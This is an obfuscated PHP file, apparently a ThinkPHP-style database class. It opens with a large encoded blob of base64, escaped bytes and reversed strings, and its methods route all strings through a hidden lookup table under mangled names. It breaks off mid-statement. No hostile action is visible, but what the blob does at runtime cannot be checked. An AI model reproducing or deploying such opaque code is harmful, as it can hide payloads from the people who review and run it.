3\52\301\255\120\236\33\173\122\66\251\102\75\316\311\144\211".base64_decode('CM/AhDs0RV1PtbvNyhwPsVe0QV7jpGm9eBQoZ78YEwpxIyxR1J1SpQMoWRECOp5BaVYaiKBcvKw=').base64_decode('qixk7p5EA8TdsuRVuwr2lJaErZIqH5ULwIk0ENMEIQsmESuLmvmxigiH/C7Ces1VwPGrs2gDy7M=')."\x4b\x2c\xcd\xb0\x81\xb1\x87\x7c\x51\xb1\x88\x7\x71\x1f\xba\x5d\xf9\xc4\x37\x2d\xfe\x7f\x53\x90\x26\xc6\xa5\xd7\x3c\x2c\xf7\x41\xc9\xf\x39\x87\xd1\x1b\x51\xd0\xce\x9a\x23\x42\x76\xc0\x62\x24\x2a\x8c\x19\xda\x55\xeb\xde\x24"."\x43\x95\xf6\x15\x71\x5b\x24\xbf\xb4\xee\xb0\xc5\x73\xbc\xac\x4b\x13\x94\x72\x1\xdf\x8e\x20\x14\x4\x2b\x8e\x75\x98\x18\xe7\x4b\x32\x4b\x7d\x9b\x4a\x7f\xfa\xe0\x97\x1d\x8f\xee\x4e\x50\xec\x6\x4d\xd6\x73\x0\x74\x5a\xc\x48".base64_decode('EZ26EISQUgidFLWC481p1Pdqz9jjFxGcLycjmKNJqjh/nQ/0csUHS2wWy3Y8CZ1AJ8iAh8IuRn8=')."\42\324\62\46\177\313\366\143\244\347\50\221\111\54\205\3\212\105\54\6\15\141\200\141\75\367\73\306\322\356\343\310\125\266\261\34\40\276\303\101\13\322\345\31\144\300\320\331\1\341\310\106\243\374\132\261"."\x28\x2e\x67\xe4\xa3\x16\x3f\x23\x20\x7b\x1e\x81\xb4\x9e\x44\x87\x4a\xfc\x82\xa9\x54\x7b\x23\x2e\x9d\x85\xe2\x8e\x94\x46\xc2\x7d\x69\xb9\x10\xa6\x97\x44\x8e\xd8\x92\xc4\x11\xca\xaf\xdf\xd0\x8b\x23\xe1\xa6\x2\xb2\xa3\x7e\x76".base64_decode('00tlmDC5SnbRz2X+CNtwxtlfqRiAtesAj2BtJqZGNmgSxssns2yQQVmoCHCQNxm1jkinPeSD4Ac=').base64_decode('Ga2xbel6HboiH1hrVH01m1pokJ9WPcNZIdmhodAxolAnTOYIIu0q553NcNM5Dx2rh+8Yw8Jo1FM=')."\x28\xe7\x19\x6f\x83\xbf\xb1\x9e\x87\x87\xbf\x78\xed\xa1\xf\x71\x78\x28\x97\x67\x41\x61\x6a\xd4\x33\xf9\x63\xdc\xb8\xff\x9c\x44\xe0\x6c\x47\x5\xe7\xe2\x66\x5a\xf8\x7c\xb9\xa\xc4\xdc\xb3\x87\xc5\x82\x6e\x19\xb7\xd0\x92\x80".base64_decode('QfCAk3ODUYsRSkMql3IeoiPiYWqcrvE7plaMVV4rl6kiD0Zz8ih7Srm4sD8jPRILJc/+F3YGbDc=')."\10\213\227\166\342\300\246\205\311\22\273\120\167\147\63\34\120\215\316\147\141\33\117\237\226\251\70\42\52\341\173\105\76\335\70\163\366\174\131\144\42\116\51\161\13\15\376\322\340\376\174\66\354\175\16\75".base64_decode('ihNeFfbCjYwpSKLTPAie4ZHOG9cJ8b/aWRKHQrPKXgHpsx5mDvPOeXxVYJc0JzNYhedhRyyZxao=').base64_decode('T9lLR56n4vijVAWBRhgPn1HYvwUjNUicxpEWqKGgx9JHPXTCPPINOGV1hEoZHgwHXMnEkOB0oWY=')."\126\145\270\170\212\4\7\100\72\51\60\17\235\125\166\134\71\25\353\154\55\211\61\255\364\106\13\106\16\222\336\41\61\270\346\125\141\23\116\311\252\224\55\151\265\211\164\265\106\141\333\304\152\135\226\250".base64_decode('z1UDXYEqACL6Jj3FQ4bFeGUsGxch5yBBniWSJf62OkOM55JIjqOF3Fi1oVcZwufANeNB/SeLrks=').base64_decode('OkvOBXL1ghK5HGaIQaPMcHs128sppSiZXyD8hATAVSXKKISN/R5lskwVbiLovhFAKaWJkTDvM5M=').strrev('Í$Ñe{ KÄ+ª"r'."\0".'Aƒ’"6Ÿ"aMVV¬2EH4É^OI'."\r".'PHRğˆÄUwBLˆ')."\115\325\275\335\61\70\210\116\333\246\374\55\300\4\37\203\334\74\23\165\300\301\202\243\260\130\165\211\262\24\354\237\204\206\335\221\154\352\310\306\23\150\135\362\4\344\340\375\50\173\210\132\164\360\202\226".base64_decode('mB7YRWkPRfA8yMEb8Bvgf2LRSFuTSA3WqQHpi5M8OCBJxh2ukLBnYtfOZQ6WsDW/fLNJH3+h34w=').base64_decode('x+GdJEi32kYUNt0eYcftYQey55CDDyaOMnAZLvWocjiQYX8OaTWbm0RzC0iCXlmgHdgP6DZ+fIw=')."\x63\x6d\x2a\x43\x77\xd\xc8\x49\x32\x1c\xc\xb0\x82\xe6\xdd\x37\x2c\xf0\x7\x9\x73\xbb\x0\xe6\xa6\x9a\x79\xaf\xd6\xd8\x35\x23\xa2\xd2\xdd\x37\xd5\x15\xc\x9b\xf0\x33\x63\x9a\xb9\xa4\x56\xc2\x86\xf2\x83\x36\xd3\xa5\xaa\x16"."\x70\x7b\xe7\x88\x6b\x19\x5d\xee\x73\x2f\x91\x71\xa3\x48\x62\x3d\xdd\x2f\x90\x7\x8e\xab\x56\x4c\xa0\x26\x72\xf6\x14\x25\xe4\x47\xea\x42\x31\x52\x2d\x5c\xa5\x13\x32\xb\xdb\x68\xc2\x41\x48\x96\xde\x70\x30\xbb\xc6\x49\x94\xa2"."\235\217\73\111\164\131\105\66\321\71\104\276\161\275\154\366\225\302\304\2\161\63\7\223\54\373\375\211\26\31\127\135\17\307\100\377\311\14\255\21\367\143\200\335\144\214\346\210\252\300\203\11\307\322\71\42"."\xe5\x55\x11\xa8\xcb\xe7\xf4\x73\x8\x25\xf0\xd5\x76\x8b\xc4\xaa\xd2\x4c\xec\x55\x5\x50\x5a\x91\x11\xaf\xa4\x57\x5b\xa9\xf0\x52\x59\x13\xc7\x1a\x72\x11\x6c\xb3\xe1\x94\xc\x32\x47\xa\xde\x6\xaf\x2b\x62\x86\xd7\x55\x9d\x61"."\321\153\32\327\366\220\73\103\15\254\260\234\52\206\45\103\114\22\110\56\332\310\255\274\267\262\214\144\345\57\337\334\127\154\306\352\270\201\167\112\262\134\101\137\362\174\60\34\323\135\62\11\165\354\214\345"."\322\62\111\21\76\45\211\234\335\324\26\215\236\352\223\7\42\137\105\73\257\273\260\133\272\220\272\54\214\135\124\205\117\13\365\260\267\46\14\223\274\373\310\152\351\351\224\337\37\304\27\41\155\46\207\44"."\274\341\304\243\6\166\276\30\344\267\316\116\43\165\311\212\200\277\367\50\11\136\235\231\261\131\223\163\373\55\252\226\55\145\226\54\51\33\26\133\260\323\71\303\364\104\172\12\150\307\352\51\133\117\53\370"."\110\167\160\51\275\263\32\146\366\127\253\30\123\323\46\252\171\26\173\134\34\345\234\365\5\71\201\135\212\317\364\102\137\303\121\352\261\56\26\2\101\14\57\124\265\42\223\172\335\253\226\206\40\61\156\73".base64_decode('QEa8KOp+SdT5PmGTJA+mD7E6nhuuWKIuMyhoEVcaRgqTp2IOXtywY6db2J8ntsjxEzUC9nykmlc=').base64_decode('mUYXlpIIARfBsZUMMLRgl8aipVi+q8IBrtMKTypPWCQqyXIItEBXQo6SbosQp5l2PiRNEkk0e5k=').base64_decode('BGqQrsGdygfchrni6CwbESmZlGJe7tEvdrIQFi4ZSTK95Qu4WT+pVI+Di5dUFVIEU4QqL6vFHbo=')."\104\210\262\142\130\14\40\150\2\127\274\204\131\305\71\250\15\13\102\132\160\131\351\164\233\66\134\45\153\272\202\17\104\61\74\53\41\304\45\357\130\302\176\112\37\221\133\207\174\302\224\311\221\261\62\126".base64_decode('eM+Syrv4ZzJMHFdt+ATtOYvL3rk4UIkokifF9Xok4QTWgxIKP3QoXDgmmnT6AuPZ+JqhPMTk0us=').base64_decode('iHWx11j6yEhIVxJI5qTqqwrwJBDQcxGpOlmPYdIC8eqNCKh0TrEkrBIJjIwxHZMvKSfxgUHOmJw=')."\xe8\xe8\x4e\x15\xd0\x60\x5c\x85\x2c\xf2\xad\x4c\x34\x73\x39\x7c\x59\x3d\x49\x32\xd5\xa3\x96\x4e\xda\xca\x1c\x39\xae\x8c\x43\x3b\x44\x58\x64\xb1\x71\x68\x64\x9e\x88\x94\x68\x5a\xc0\x99\x44\xf3\xeb\xae\x79\x93\xb\xb8\xe7\x94".base64_decode('lpDPO0f8iGGnshI/X5lYGV+qWGboQPVxuHvLVtmt1yQqqeiPpHSVMKuUoT2qWowm4ZKCo3KUnWQ=').base64_decode('CnBZmoTLViSzwhXzSsrZWtmaZHiVkweiynSVAQsRoJR1svmsmrmyOdgD7txEIFa9F5LE0KkKU60=')."\x17\x55\x33\x4f\xda\xb\x77\x6e\x41\x7\x61\xfe\xb9\x5a\x4a\xd5\xd\xa\x3a\x1e\x55\x4e\xc\x96\x52\xe5\x8c\xa0\xf8\x6f\x52\x1d\x33\xa1\x82\x55\x79\x58\x89\xb4\x2a\x5a\x60\xe0\xf7\xcb\xe5\x50\xac\x4a\xb2\xac\x52\x56\x5d\xe9"."\x2c\x56\x15\xbf\x59\x4e\xc5\x30\x57\xbc\xe3\xa9\x1\x8a\x92\x18\x61\x3c\x24\xdb\x1c\x73\x75\x48\x51\x13\x22\x18\x73\xc6\x20\x64\x97\xcc\x83\xa6\x3a\x8e\xb7\x72\x61\xb0\x60\xf2\x23\x33\x2d\x74\xad\x79\x47\x2a\x2a\x70\xee\x83"."\102\131\172\151\247\252\201\222\7\113\265\52\345\107\71\366\204\204\154\332\105\331\171\23\161\236\222\62\252\60\117\341\43\63\4\177\233\23\162\150\367\155\201\20\274\71\264\227\252\211\326\161\24\375\364\11"."\347\361\264\76\211\106\23\0\342\60\40\244\224\21\334\60\122\45\205\40\326\220\341\227\323\344\256\200\122\22\64\71\156\226\154\17\325\256\57\222\337\26\323\266\205\156\17\273\271\100\174\0\46\7\74\222".strrev('¹y"sHä^eÒtÍN·ñ¶¢ŞUˆTkàç¤¦qFE. ŸÀ{½0À“räS¸Ò·úV').base64_decode('BM+Qkt4dcWtj+WmKH96W9JJbDy/4HV5dHHAUp0+Lc635z6sBJP6iCvoQHJHwgtFiPBGvSOoOxOM=')."\313\242\261\126\372\156\134\105\62\51\45\351\70\126\44\165\167\104\273\46\113\13\165\6\302\221\212\64\254\16\331\245\12\127\341\64\51\334\115\172\111\356\377\47\353\105\70\270\104\364\204\335\101\106\340\145"."\164\261\10\322\15\134\61\153\26\46\133\107\126\101\134\143\336\30\345\313\50\75\57\374\313\213\112\234\22\65\371\302\312\142\117\323\360\17\347\143\322\56\335\143\247\66\15\203\134\250\26\353\70\166\101\113".base64_decode('sSLE4sf3OALg/ITQq/E5VHqkeLJJCNaR9q58upNLXC5oI8nTqs5mlZtE+ToWp4rJwd08hb2Ss9o=').base64_decode('TErajJS3A9cFMN2SViv9diTb2oCXowNJWYUKvzFSEGLp/wONcy86QMkAAA==')."", 10, -8))); goto fˆˆàÙ; bàÂåáÛ³›: class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\x74\x68\x69\156\x6b\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\145\x71" => "\x3d", "\156\145\161" => "\74\x3e", "\x67\164" => "\x3e", "\145\147\x74" => "\x3e\x3d", "\x6c\164" => "\74", "\145\x6c\164" => "\x3c\x3d", "\x6e\x6f\164\154\151\x6b\145" => "\116\117\x54\x20\114\111\x4b\105", "\x6c\151\x6b\145" => "\x4c\x49\113\x45", "\x69\x6e" => "\x49\116", "\156\157\164\x69\x6e" => "\116\x4f\124\40\x49\x4e", "\x6e\x6f\x74\40\151\156" => "\116\117\x54\x20\111\x4e", "\142\x65\x74\x77\145\x65\156" => "\x42\105\124\x57\x45\x45\x4e", "\x6e\157\164\142\x65\164\x77\x65\x65\x6e" => "\x4e\117\x54\40\x42\x45\124\127\x45\x45\x4e", "\x6e\x6f\164\40\142\145\164\x77\145\145\156" => "\x4e\117\x54\x20\102\105\124\x57\105\x45\116"); protected $selectSql = "\123\105\x4c\x45\x43\x54\x25\x44\111\123\x54\x49\x4e\103\x54\x25\x20\x25\x46\x49\x45\114\104\45\40\106\122\x4f\115\40\x25\x54\101\102\x4c\105\45\45\x4a\x4f\x49\x4e\x25\x25\x57\x48\105\x52\x45\45\x25\107\x52\x4f\x55\x50\x25\x25\110\101\126\111\116\107\x25\45\x4f\122\x44\x45\x52\45\x25\114\111\x4d\111\x54\x25\40\45\125\116\111\x4f\116\45\x25\x43\x4f\115\115\x45\116\124\45"; protected $bind = array(); public static function getInstance() { $é£¾Ã‰œ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[©—Ò»ÅĞ][1128], $é£¾Ã‰œ); } public function factory($äŒİËÉø = '') { $†¥­ë§â =& $_SERVER[©—Ò»ÅĞ]; $äŒİËÉø = $this->parseConfig($äŒİËÉø); if (empty($äŒİËÉø[$†¥­ë§â[1129]])) { think_exception(think_lang($†¥­ë§â[1130])); } $this->dbType = ucwords(strtolower($äŒİËÉø[$†¥­ë§â[1129]])); $­¥Äšü± = $†¥­ë§â[1131] . $this->dbType; if (class_exists($­¥Äšü±)) { $€ãåøú = new $­¥Äšü±($äŒİËÉø); if ($†¥­ë§â[1132] != strtolower($äŒİËÉø[$†¥­ë§â[1129]])) { $€ãåøú->dbType = strtoupper($this->dbType); } else { $€ãåøú->dbType = $this->_getDsnType($äŒİËÉø[$†¥­ë§â[1081]]); } } else { think_exception(think_lang($†¥­ë§â[1133]) . $†¥­ë§â[1134] . $­¥Äšü±); } return $€ãåøú; } public function __call($šÀØ¿, $©ôõæÛœ) { if (method_exists($this, $šÀØ¿)) { return call_user_func_array(array($this, $šÀØ¿), $©ôõæÛœ); } } protected function _getDsnType($Ñê·ßâÅ) { $¨İ¹¾ê = explode($_SERVER[©—Ò»ÅĞ][4], $Ñê·ßâÅ); $ØÊµ÷öğ = strtoupper(trim($¨İ¹¾ê[0])); return $ØÊµ÷öğ; } private function parseConfig($´‰×¾éı = '') { $ìµ¯Øôè =& $_SERVER[©—Ò»ÅĞ]; if (!empty($´‰×¾éı) && is_string($´‰×¾éı)) { $´‰×¾éı = $this->parseDSN($´‰×¾éı); } elseif (is_array($´‰×¾éı)) { $´‰×¾éı = array_change_key_case($´‰×¾éı); $´‰×¾éı = array($ìµ¯Øôè[1129] => $´‰×¾éı[$ìµ¯Øôè[1135]], $ìµ¯Øôè[1049] => $´‰×¾éı[$ìµ¯Øôè[1136]], $ìµ¯Øôè[1050] => $´‰×¾éı[$ìµ¯Øôè[1137]], $ìµ¯Øôè[1047] => $´‰×¾éı[$ìµ¯Øôè[1138]], $ìµ¯Øôè[1048] => $´‰×¾éı[$ìµ¯Øôè[1139]], $ìµ¯Øôè[21] => $´‰×¾éı[$ìµ¯Øôè[1140]], $ìµ¯Øôè[1081] => $´‰×¾éı[$ìµ¯Øôè[1141]], $ìµ¯Øôè[17] => isset($´‰×¾éı[$ìµ¯Øôè[1142]]) ? $´‰×¾éı[$ìµ¯Øôè[1142]] : array()); } elseif (empty($´‰×¾éı)) { if (think_config($ìµ¯Øôè[1143]) && $ìµ¯Øôè[1132] != strtolower(think_config($ìµ¯Øôè[1144]))) { $´‰×¾éı = $this->parseDSN(think_config($ìµ¯Øôè[1143])); } else { $´‰×¾éı = array($ìµ¯Øôè[1129] => think_config($ìµ¯Øôè[1144]), $ìµ¯Øôè[1049] => think_config($ìµ¯Øôè[1145]), $ìµ¯Øôè[1050] => think_config($ìµ¯Øôè[1146]), $ìµ¯Øôè[1047] => think_config($ìµ¯Øôè[1147]), $ìµ¯Øôè[1048] => think_config($ìµ¯Øôè[1148]), $ìµ¯Øôè[21] => think_config($ìµ¯Øôè[323]), $ìµ¯Øôè[1081] => think_config($ìµ¯Øôè[1143]), $ìµ¯Øôè[17] => think_config($ìµ¯Øôè[1149])); } } return $´‰×¾éı; } protected function initConnect($ß¸†‚éÔ = true) { if (1 == think_config($_SERVER[©—Ò»ÅĞ][22])) { $this->_linkID = $this->multiConnect($ß¸†‚éÔ); } else { if (isset($this->config) && $this->config) { $this->configLast = $this->config; } } if (!isset($this->connected) || !$this->connected) { $this->_linkID = $this->connect(); } $this->initConnectAfter(); } protected function initConnectAfter() { } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $×Ò‰®ç± => $Ôª¯öé™) { $this->_linkID = $Ôª¯öé™; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($ãé¥ö = false) { $÷¬¿ğ÷» =& $_SERVER[©—Ò»ÅĞ]; static $½Æ·ë¿ì = array(); static $ôä¼Óß = -1; if (empty($½Æ·ë¿ì)) { foreach ($this->config as $íÇş­¥® => $‡ÂÚ…ˆ¨) { $½Æ·ë¿ì[$íÇş­¥®] = explode($÷¬¿ğ÷»[50], $‡ÂÚ…ˆ¨); } } if (think_config($÷¬¿ğ÷»[1150])) { if ($ãé¥ö || think_config($÷¬¿ğ÷»[486]) === !0) { $±ËºŸ»Ô = floor(mt_rand(0, think_config($÷¬¿ğ÷»[1151]) - 1)); $ôä¼Óß = $±ËºŸ»Ô; } else { if (is_numeric(think_config($÷¬¿ğ÷»[1152]))) { $±ËºŸ»Ô = think_config($÷¬¿ğ÷»[1152]); } else { $±ËºŸ»Ô = floor(mt_rand(think_config($÷¬¿ğ÷»[1151]), count($½Æ·ë¿ì[$÷¬¿ğ÷»[1047]]) - 1)); } } } else { $±ËºŸ»Ô = floor(mt_rand(0, count($½Æ·ë¿ì[$÷¬¿ğ÷»[1047]]) - 1)); $ôä¼Óß = $±ËºŸ»Ô; } $±ËºŸ»Ô = $ôä¼Óß !== -1 ? $ôä¼Óß : $±ËºŸ»Ô; $Œ±§Ï‰õ = array($÷¬¿ğ÷»[1049] => isset($½Æ·ë¿ì[$÷¬¿ğ÷»[1049]][$±ËºŸ»Ô]) ? $½Æ·ë¿ì[$÷¬¿ğ÷»[1049]][$±ËºŸ»Ô] : $½Æ·ë¿ì[$÷¬¿ğ÷»[1049]][0], $÷¬¿ğ÷»[1050] => isset($½Æ·ë¿ì[$÷¬¿ğ÷»[1050]][$±ËºŸ»Ô]) ? $½Æ·ë¿ì[$÷¬¿ğ÷»[1050]][$±ËºŸ»Ô] : $½Æ·ë¿ì[$÷¬¿ğ÷»[1050]][0], $÷¬¿ğ÷»[1047] => isset($½Æ·ë¿ì[$÷¬¿ğ÷»[1047]][$±ËºŸ»Ô]) ? $½Æ·ë¿ì[$÷¬¿ğ÷»[1047]][$±ËºŸ»Ô] : $½Æ·ë¿ì[$÷¬¿ğ÷»[1047]][0], $÷¬¿ğ÷»[1048] => isset($½Æ·ë¿ì[$÷¬¿ğ÷»[1048]][$±ËºŸ»Ô]) ? $½Æ·ë¿ì[$÷¬¿ğ÷»[1048]][$±ËºŸ»Ô] : $½Æ·ë¿ì[$÷¬¿ğ÷»[1048]][0], $÷¬¿ğ÷»[21] => isset($½Æ·ë¿ì[$÷¬¿ğ÷»[21]][$±ËºŸ»Ô]) ? $½Æ·ë¿ì[$÷¬¿ğ÷»[21]][$±ËºŸ»Ô] : $½Æ·ë¿ì[$÷¬¿ğ÷»[21]][0], $÷¬¿ğ÷»[1081] => isset($½Æ·ë¿ì[$÷¬¿ğ÷»[1081]][$±ËºŸ»Ô]) ? $½Æ·ë¿ì[$÷¬¿ğ÷»[1081]][$±ËºŸ»Ô] : $½Æ·ë¿ì[$÷¬¿ğ÷»[1081]][0], $÷¬¿ğ÷»[17] => isset($½Æ·ë¿ì[$÷¬¿ğ÷»[17]][$±ËºŸ»Ô]) ? $½Æ·ë¿ì[$÷¬¿ğ÷»[17]][$±ËºŸ»Ô] : $½Æ·ë¿ì[$÷¬¿ğ÷»[17]][0]); return $this->connect($Œ±§Ï‰õ, $±ËºŸ»Ô); } public function parseDSN($ÔÀ—ËíÀ) { $Óé•Œ¬Õ =& $_SERVER[©—Ò»ÅĞ]; if (empty($ÔÀ—ËíÀ)) { return !1; } $´ŒšÏ«‰ = parse_url($ÔÀ—ËíÀ); if ($´ŒšÏ«‰[$Óé•Œ¬Õ[205]]) { $†êÂ³Ü³ = array($Óé•Œ¬Õ[1129] => $´ŒšÏ«‰[$Óé•Œ¬Õ[205]], $Óé•Œ¬Õ[1049] => isset($´ŒšÏ«‰[$Óé•Œ¬Õ[684]]) ? $´ŒšÏ«‰[$Óé•Œ¬Õ[684]] : $Óé•Œ¬Õ[12], $Óé•Œ¬Õ[1050] => isset($´ŒšÏ«‰[$Óé•Œ¬Õ[1153]]) ? $´ŒšÏ«‰[$Óé•Œ¬Õ[1153]] : $Óé•Œ¬Õ[12], $Óé•Œ¬Õ[1047] => isset($´ŒšÏ«‰[$Óé•Œ¬Õ[206]]) ? $´ŒšÏ«‰[$Óé•Œ¬Õ[206]] : $Óé•Œ¬Õ[12], $Óé•Œ¬Õ[1048] => isset($´ŒšÏ«‰[$Óé•Œ¬Õ[207]]) ? $´ŒšÏ«‰[$Óé•Œ¬Õ[207]] : $Óé•Œ¬Õ[12], $Óé•Œ¬Õ[21] => isset($´ŒšÏ«‰[$Óé•Œ¬Õ[87]]) ? substr($´ŒšÏ«‰[$Óé•Œ¬Õ[87]], 1) : $Óé•Œ¬Õ[12]); } else { preg_match($Óé•Œ¬Õ[1154], trim($ÔÀ—ËíÀ), $™–¦Ãíî); $†êÂ³Ü³ = array($Óé•Œ¬Õ[1129] => $™–¦Ãíî[1], $Óé•Œ¬Õ[1049] => $™–¦Ãíî[2], $Óé•Œ¬Õ[1050] => $™–¦Ãíî[3], $Óé•Œ¬Õ[1047] => $™–¦Ãíî[4], $Óé•Œ¬Õ[1048] => $™–¦Ãíî[5], $Óé•Œ¬Õ[21] => $™–¦Ãíî[6]); } $†êÂ³Ü³[$Óé•Œ¬Õ[1081]] = $Óé•Œ¬Õ[12]; return $†êÂ³Ü³; } protected function debug() { $¿æ®¼¢¤ =& $_SERVER[©—Ò»ÅĞ]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $¿æ®¼¢¤[1155]; if (think_config($¿æ®¼¢¤[1156])) { think_status($¿æ®¼¢¤[1157]); think_trace($this->queryStr . $¿æ®¼¢¤[1158] . think_status($¿æ®¼¢¤[24], $¿æ®¼¢¤[1157], 6) . $¿æ®¼¢¤[1159], $¿æ®¼¢¤[12], $¿æ®¼¢¤[1160]); } } protected function parseLock($Ë±ê’¸ç = false) { $÷ñËãÛŠ =& $_SERVER[©—Ò»ÅĞ]; if (!$Ë±ê’¸ç) { return $÷ñËãÛŠ[12]; } if ($÷ñËãÛŠ[1083] == $this->dbType) { return $÷ñËãÛŠ[1161]; } return $÷ñËãÛŠ[1162]; } protected function parseSet($ƒêş‡¢) { $·åşí°± =& $_SERVER[©—Ò»ÅĞ]; foreach ($ƒêş‡¢ as $Ä®æ— => $îŠÃµê²) { if (is_array($îŠÃµê²) && $·åşí°±[372] == $îŠÃµê²[0]) { $·¿İ×«¡[] = $this->parseKey($Ä®æ—) . $·åşí°±[464] . $îŠÃµê²[1]; } elseif (is_scalar($îŠÃµê²) || is_null($îŠÃµê²)) { $·¿İ×«¡[] = $this->parseKey($Ä®æ—) . $·åşí°±[464] . $this->parseValue($îŠÃµê²); } } return $·åşí°±[1163] . implode($·åşí°±[50], $·¿İ×«¡); } protected function bindParam($°ø¥Âûü, $“­¹¶ëÚ) { $this->bind[$_SERVER[©—Ò»ÅĞ][4] . $°ø¥Âûü] = $“­¹¶ëÚ; } protected function parseBind($½¯½ËÆ¡) { $½¯½ËÆ¡ = array_merge($this->bind, $½¯½ËÆ¡); $this->bind = array(); return $½¯½ËÆ¡; } function parseKey(&$†Ô”Ê±•, $«Öø°Ë¡ = true) { if ($«Öø°Ë¡) { $†Ô”Ê±• = $this->parseKeyCheck($†Ô”Ê±•); } return $†Ô”Ê±•; } function parseKeyCheck($Á§¡¿‡ú) { $÷›ê¾†“ =& $_SERVER[©—Ò»ÅĞ]; $Á§¡¿‡ú = trim($Á§¡¿‡ú); if (!preg_match($÷›ê¾†“[1164], $Á§¡¿‡ú)) { think_exception($÷›ê¾†“[1165] . $Á§¡¿‡ú); } return $Á§¡¿‡ú; } protected function parseValue($ı¨„ï©) { $‹·µ·÷ =& $_SERVER[©—Ò»ÅĞ]; if (is_string($ı¨„ï©)) { $ı¨„ï© = $‹·µ·÷[1122] . $this->escapeString($ı¨„ï©) . $‹·µ·÷[1122]; } elseif (isset($ı¨„ï©[0]) && is_string($ı¨„ï©[0]) && strtolower($ı¨„ï©[0]) == $‹·µ·÷[372]) { $ı¨„ï© = $this->escapeString($ı¨„ï©[1]); } elseif (is_array($ı¨„ï©)) { $ı¨„ï© = array_map(array($this, $‹·µ·÷[1123]), $ı¨„ï©); } elseif (is_bool($ı¨„ï©)) { $ı¨„ï© = $ı¨„ï© ? $‹·µ·÷[91] : $‹·µ·÷[228]; } elseif (is_null($ı¨„ï©)) { $ı¨„ï© = $‹·µ·÷[103]; } return $ı¨„ï©; } protected function parseField($°Õöä³) { $ãàè©Ú‚ =& $_SERVER[©—Ò»ÅĞ]; if (is_string($°Õöä³) && strpos($°Õöä³, $ãàè©Ú‚[50])) { $°Õöä³ = explode($ãàè©Ú‚[50], $°Õöä³); } if (is_array($°Õöä³)) { $Ã‘Ë‚ = array(); foreach ($°Õöä³ as $•Å³Ó±Ç => $¤°ÍÈıä) { if (!is_numeric($•Å³Ó±Ç)) { $Ã‘Ë‚[] = $this->parseKey($•Å³Ó±Ç, !1) . $ãàè©Ú‚[1166] . $this->parseKey($¤°ÍÈıä); } else { $Ã‘Ë‚[] = $this->parseKey($¤°ÍÈıä); } } $¢Á¡²È¶ = implode($ãàè©Ú‚[50], $Ã‘Ë‚); } elseif (is_string($°Õöä³) && !empty($°Õöä³)) { $¢Á¡²È¶ = $°Õöä³; } else { $¢Á¡²È¶ = $ãàè©Ú‚[220]; } return $¢Á¡²È¶; } protected function parseTable($şé˜æ°„) { $¦‚¾€š¦ =& $_SERVER[©—Ò»ÅĞ]; if (is_array($şé˜æ°„)) { $„½ù ¼ = array(); foreach ($şé˜æ°„ as $¥Ôˆâ => $¶Íîû³â) { if (!is_numeric($¥Ôˆâ)) { $„½ù ¼[] = $this->parseKey($¥Ôˆâ) . $¦‚¾€š¦[53] . $this->parseKey($¶Íîû³â); } else { $„½ù ¼[] = $this->parseKey($¥Ôˆâ); } } $şé˜æ°„ = $„½ù ¼; } elseif (is_string($şé˜æ°„)) { if (strstr($şé˜æ°„, $¦‚¾€š¦[53])) { return $şé˜æ°„; } $şé˜æ°„ = explode($¦‚¾€š¦[50], $şé˜æ°„); array_walk($şé˜æ°„, array($this, $¦‚¾€š¦[1067])); } return $¦‚¾€š¦[1061] . trim(implode($¦‚¾€š¦[1167], $şé˜æ°„), $¦‚¾€š¦[475]) . $¦‚¾€š¦[1061]; } protected function parseWhere($®òĞïûŒ) { $Š¢§¨² =& $_SERVER[©—Ò»ÅĞ]; $¸°ããÎÄ = $Š¢§¨²[12]; if (is_string($®òĞïûŒ)) { $¸°ããÎÄ = $®òĞïûŒ; } else { $ÆõÔÍ = isset($®òĞïûŒ[$Š¢§¨²[1168]]) ? strtoupper($®òĞïûŒ[$Š¢§¨²[1168]]) : $Š¢§¨²[12]; if (in_array($ÆõÔÍ, array($Š¢§¨²[1169], $Š¢§¨²[1170], $Š¢§¨²[1171]))) { $ÆõÔÍ = $Š¢§¨²[53] . $ÆõÔÍ . $Š¢§¨²[53]; unset($®òĞïûŒ[$Š¢§¨²[1168]]); } else { $ÆõÔÍ = $Š¢§¨²[1172]; } foreach ($®òĞïûŒ as $†¬ÙãÒª => $÷œ˜í¤ù) { $¸°ããÎÄ .= $Š¢§¨²[355]; if (is_numeric($†¬ÙãÒª)) { $†¬ÙãÒª = $Š¢§¨²[1173]; } if (0 === strpos($†¬ÙãÒª, $Š¢§¨²[11])) { $¸°ããÎÄ .= $this->parseThinkWhere($†¬ÙãÒª, $÷œ˜í¤ù); } else { if (!preg_match($Š¢§¨²[1174], trim($†¬ÙãÒª))) { think_exception(think_lang($Š¢§¨²[1175]) . $Š¢§¨²[4] . $†¬ÙãÒª); } $¢í«¿·ğ = is_array($÷œ˜í¤ù) && isset($÷œ˜í¤ù[$Š¢§¨²[1176]]); $†¬ÙãÒª = trim($†¬ÙãÒª); if (strpos($†¬ÙãÒª, $Š¢§¨²[212])) { $­ı¦í§æ = explode($Š¢§¨²[212], $†¬ÙãÒª); $«³›×é” = array(); foreach ($­ı¦í§æ as $¢Øç¶Ìè => $ĞÍÛ¿™³) { $Ü‰úĞ—Â = $¢í«¿·ğ ? $÷œ˜í¤ù[$¢Øç¶Ìè] : $÷œ˜í¤ù; $«³›×é”[] = $Š¢§¨²[337] . $this->parseWhereItem($this->parseKey($ĞÍÛ¿™³), $Ü‰úĞ—Â) . $Š¢§¨²[1066]; } $¸°ããÎÄ .= implode($Š¢§¨²[1177], $«³›×é”); } elseif (strpos($†¬ÙãÒª, $Š¢§¨²[284])) { $­ı¦í§æ = explode($Š¢§¨²[284], $†¬ÙãÒª); $«³›×é” = array(); foreach ($­ı¦í§æ as $¢Øç¶Ìè => $ĞÍÛ¿™³) { $Ü‰úĞ—Â = $¢í«¿·ğ ? $÷œ˜í¤ù[$¢Øç¶Ìè] : $÷œ˜í¤ù; $«³›×é”[] = $Š¢§¨²[337] . $this->parseWhereItem($this->parseKey($ĞÍÛ¿™³), $Ü‰úĞ—Â) . $Š¢§¨²[1066]; } $¸°ããÎÄ 